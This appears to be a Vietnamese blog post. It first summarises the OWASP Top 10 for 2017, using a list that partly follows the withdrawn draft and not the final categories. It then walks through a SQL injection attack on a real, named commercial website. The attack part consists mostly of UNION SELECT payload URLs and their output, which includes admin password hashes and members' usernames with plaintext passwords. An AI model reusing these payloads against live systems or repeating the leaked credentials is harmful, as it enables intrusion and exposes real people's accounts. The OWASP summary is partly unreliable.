# 1. Top10 lỗ hổng bảo mật web của OWASP-2017
## A1 – Injection (Lỗi nhúng mã)
Nếu ứng dụng của bạn có thể nhận dữ liệu đầu vào người dùng đến cơ sở dữ liệu back-end, tập lệnh hay cuộc gọi thì ứng dụng của bạn có thể sẽ phải đối mặt với cuộc tấn công bằng mã nhúng. Lỗi nhúng mã là tập hợp các lỗ hổng bảo mật xảy ra khi dữ liệu đáng ngờ được chèn vào ứng dụng dưới dạng lệnh hay truy vấn. Các cuộc tấn công mã nhúng đã biết như: SQL, OS, XXE và LDAP. Trong đó, phổ biến nhất là tấn công SQL, còn được biết đến là SQLi. Một cuộc tấn công SQLi thành công khi đoạn mã sai được gửi đến dữ liệu máy chủ và tiếp cận với hệ thống dữ liệu của bạn. Kiểu tấn công này rất đơn giản và dễ dàng, bất cứ ai truy cập được vào Internet đều có thể thực hiện – các tập lệnh SQLi luôn có sẵn để download hoặc rất dễ dàng mua được.
## A2 – Broken Authentication and Session Management
Khi các chức năng của ứng dụng được thực hiện không chính xác, tin tặc có thể dễ dàng xâm nhập, ăn cắp thông tin tài khoản, mật khẩu và khai thác các lỗ hổng khác bằng cách sử dụng các chứng chỉ đã đánh cắp. Tài khoản mỗi người dùng cá nhân nên là duy nhất, không bị trùng lặp dưới bất kì hình thức nào. Nếu không có bất kì sự quản lý cần thiết nào thì tin tặc có thể lẻn vào, ngụy trang thành người dùng để ăn cắp thông tin tài khoản, mật khẩu và sử dụng cho những lần truy cập sau này.
## A3 – Cross-site Scripting (XSS)
XSS là một lỗ hổng thường thấy trong các ứng dụng web. XSS cho phép tin tặc đưa các kịch bản phía máy khách vào các trang web công cộng và trong nhiều trường hợp, tin tặc có thể sử dụng các công cụ kiểm soát truy cập của họ. Chúng thực hiện bằng cách đánh lừa trình duyệt chấp nhận dữ liệu từ một nguồn không đáng tin cậy. Điều này thường xảy ra khi tin tặc sử dụng mã quen thuộc (ví dụ như JavaScript) vì các nhà phát triển ứng dụng không loại trừ các kí tự này.
Các ứng dụng cho phép người dùng nhập dữ liệu vào mà không có toàn quyền kiểm soát dữ liệu ra có nguy cơ bị tấn công XSS rất cao. Một cuộc tấn công XSS thành công có thể gây thiệt hại nghiêm trọng cho các trang web và có khả năng kéo người dùng vào các trang web khác (thường chứa nhiều mã độc hơn). Một số kiểu tấn công XSS khác như: Stored XSS, DOM Based XSS và Reflected XSS.
Đọc thêm về lỗ hổng XSS và cách thức kiểm thử lỗ hổng này tại đây.
## A4 – Broken Access Control
Khi người dùng bị hạn chế kiểm soát truy cập, tin tặc có thể khai thác và truy cập các chức năng hoặc dữ liệu trái phép. Kiểm soát truy cập nhằm mục đích kiểm soát người dùng được ủy quyền được phép hay không được phép làm gì trong một ứng dụng và để thiết lập quyền kiểm soát truy cập một cách hợp lí, ứng dụng phải đảm bảo rằng nó đang nghiêm túc thực hiện kiểm tra ủy quyền và xác thực hợp lệ để xác định người dùng được đặc quyền, thực tế là những người dùng Internet ngẫu nhiên.
Nguyên nhân lỗi kiểm soát truy cập xảy ra có thể là do các nhà phát triển thường bị bế tắc trong việc kiểm soát truy cập phù hợp với các quy tắc đặt ra.
A5 – Security Misconfiguration (Sai sót cấu hình an ninh)
Do cấu hình an ninh lỏng lẻo tại các tầng kiến trúc của web như nền tảng, framework, máy chủ, cơ sở dữ liệu và mã tùy chỉnh nên tin tặc có thể khai thác tấn công và có quyền truy cập dữ liệu. Vì thế, tất cả các tầng kiến trúc của web phải được cập nhật thường xuyên.
 ![](https://images.viblo.asia/b1a01800-dc8e-4abf-8f1c-6b7bc89e9f14.png)
Không có nhiều thay đổi trong danh sách của năm 2013 với năm 2017
## A6 – Sensitive Data Exposure (Lộ dữ liệu nhạy cảm)
Việc tiếp xúc dữ liệu nhạy cảm xảy ra khi các kiểm soát bảo mật, chẳng hạn như HTTPS không được thực hiện chính xác và để lại lỗ hổng, giúp tin tặc có thể ăn cắp thông tin tài khoản, mật khẩu, địa chỉ hay bất cứ thông tin có giá trị nào khác. Vì vậy, các ứng dụng cần đảm bảo truy cập được xác thực và dữ liệu đã được mã hóa. Nếu không sẽ dẫn đến việc vi phạm quyền riêng tư ở quy mô lớn.
## A7 – Insufficient Attack Protection
Để xem xét có bao nhiêu ứng dụng và API phải vật lộn để phát hiện, ngăn chặn và phản hồi các cuộc tấn công, các chuyên gia phải sử dụng các phương pháp kiểm thử bảo mật, đánh giá tính dễ tổn thương và sử dụng WAF hay RASP để phát hiện và vá lỗi nhanh. Người ta chỉ có thể dựa vào chức năng quét mã nguồn dễ bị tổn thương để bảo vệ các ứng dụng từ các cuộc tấn công không gian đơn giản và tinh vi. Cả RASP và WAF đều hoạt động bên trong ứng dụng và sẽ phát hiện, ngăn chặn các cuộc tấn công. RASP hiện là một công nghệ đang được chú ý, nhiều nhà phát triển đang cân nhắc triển khai trong ứng dụng của họ. Tuy nhiên, các nhà phát triển quan ngại về hiệu năng, tính năng và cả tính bảo mật của nó. Do đó, tương tự như RASP là IAST được coi là giải pháp hữu hiệu hơn, được thiết kế để tích hợp trong ứng dụng.
## A8 – Cross-Site Request Forgery (CSRF)
Một cuộc tấn công CSRF sẽ yêu cầu người dùng cuối xác thực trên một ứng dụng web, sau đó, tin tặc lợi dụng điều đó để ăn cắp thông tin tài khoản người dùng và cướp quyền kiểm soát trình duyệt của người dùng.
Các cuộc tấn công CSRF xảy ra khi HTTP trong trình duyệt của người dùng bị giả mạo, tin tặc sẽ thao tác trong cookie và các phiên. Trình duyệt và ứng dụng sẽ bị đánh lừa rằng các yêu cầu này là hợp pháp và cho phép tin tặc đánh cắp thông tin một cách lặng lẽ.
## A9 – Using Components with Known Vulnerabilities
Nguyên nhân của lỗi này là do việc sử dụng mà không kiểm duyệt các thư viện, plug-in, ứng dụng… đã tồn tại lỗ hổng (thường là mã nguồn mở công cộng). Tin tặc sẽ lợi dụng từ đây để tấn công hệ thống thông qua phương pháp SQLi và XSS.
## A10 – Underprotected APIs
API ngày càng trở nên phổ biến trong thế giới ứng dụng ngày nay bởi các ứng dụng thường được viết bằng JavaScript và sử dụng API để lấy dữ liệu. Do đó, API đóng vai trò như một liên kết giữa các nền tảng khách hàng phức tạp và một loạt các ứng dụng hay dịch vụ web. Tuy nhiên, bản thân các API chứa các lỗ hổng khiến ứng dụng của chúng ta rất dễ bị tấn công. API cũng chứa nhiều giao thức phức tạp như SOAP/XML, REST/JSON, RPC và GWT mà kiểm thử bảo mật không thể kiểm tra thành công, khiến các API trở thành điểm mù quan trọng trong các tổ chức đang sử dụng chúng.
# 2. Phân tích và demo 01kỹ thuật tấn công SQL Injection 
## Các bước thực hiện 
### **B1: Truy cập vào web:** http://vnbarcode.com/?php=product_detail&id=316

### **B2: thử kiểm tra xem database có bao nhiêu cột**
* try:
http://vnbarcode.com/?php=product_detail&id=316 order by 20 ---> không có lỗi

* try:
http://vnbarcode.com/?php=product_detail&id=316 order by 21 ---> có lỗi

***=> vì vậy sẽ có 20 cột
COLUM: 20 *
**
**
### B3: tìm các trường bị lỗi hiển thị lên web:**
`http://vnbarcode.com/?php=product_detail&id=-316 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20`

> ERROR: 5,8
> 
> USER: vnbarcodec_ha
> SERVER NAME: vnbarcodec_ha@localhost

**- select các bảng:**
`http://vnbarcode.com/?php=product_detail&id=-316 UNION SELECT 1,2,3,4,DATABASE(),6,7,unhex(hex(group_concat(table_name))),8,9,10,11,12,13,14,15,16,17,18,19 from information_schema.tables where table_schema=database()--`

>tbl_config,tbl_content,tbl_content_category,tbl_member,tbl_product,tbl_product_category,tbl_product_download,tbl_product_new,tbl_product_special,tbl_product_top,tbl_support,tbl_support_category,tbl_user,tbl_visitor

**-select các trường trong bảng user và member:**
`http://vnbarcode.com/?php=product_detail&id=-316 UNION SELECT 1,2,3,4,DATABASE(),6,7,unhex(hex(group_concat(column_name))),8,9,10,11,12,13,14,15,16,17,18,19 from information_schema.columns where table_name=tbl_user--`
> 	- tbl_user
> 		id,uid,pwd,cat_id
> 	- tbl_member
> 		`member_id,member_name,member_sex,member_address,member_tel,member_fax,member_email,member_logo,member_website,member_yahoo,member_skype,uid,pwd,member_sort,member_status,member_date_added,member_last_modified,member_detail`

> unhex(hex(group_concat(id,0x207c20,uid,0x207c20,pwd,0x207c20,cat_id)))... from tbl_user

`http://vnbarcode.com/?php=product_detail&id=-316 UNION SELECT 1,2,3,4,DATABASE(),6,7,unhex(hex(group_concat(id,0x207c20,uid,0x207c20,pwd,0x207c20,cat_id))),8,9,10,11,12,13,14,15,16,17,18,19 from tbl_user--`

> 	1 | admincp | 31b5d7b1a473763500b9b0d66e1a63c2 | Admincp,		admincp
> 	2 | subadmin | 31b5d7b1a473763500b9b0d66e1a63c2 | Subadmin

> unhex(hex(group_concat(member_id,0x207c20,member_name,0x207c20,uid,0x207c20,pwd))

> member | member,phanluongha | phanluongha,luongha | luongha,phanluongha1 | 123456,phanluongha2 | 123456,hai | tranhoang, | chbc2Gf82E,chPPOhkLRTsbLyuESN | ,YhKQEiEZWs | ,DHHNkCicIFewU | ,GSeDteknGAoQoQgDs | ,88129 | ,826205 | ,6184 | ,WwotHZwV | ,RSttWIpIvxdOHBpqy | ,cccccc | cccccc,hqXmYydOpToYCjw | ,uScoAhUkINqMg | ,byHtlZIUUnThIrWzSo | ,nhom3 | 123456,EbKcvFBvLuOMxVPiJ | ,QuPceCzggExr | ,OpiImyqQvG | ,kDslyeJGceIsROKcn | ,Long | 111111,SIOPcMtvAvRcg | ,1 | 1,2 | 123456,tptdynamic | abdcdef00,adminpc | 123455,adsfas | vfdvádfasdfazc,ngocanh | levungocanh,admincp | chandoi,loilxag | 123456,thanhkhoa | 123456,${100056+99573} | 1,${99054+100450} | 1,1&n981567=v929338 | 1,response.write(9989347*9852240) | 1,'+response.write(9989347*9852240)+' | 1,"+response.write(9989347*9852240)+" | 1,response.write(9699590*9130796) | 1,'+response.write(9699590*9130796)+' | 1,SomeCustomInjectedHeader:injected_by_wvs | 1,"+response.write(9699590*9130796)+" | 1,http://some-inexistent-website.acu/some_inexistent_file_with_long_n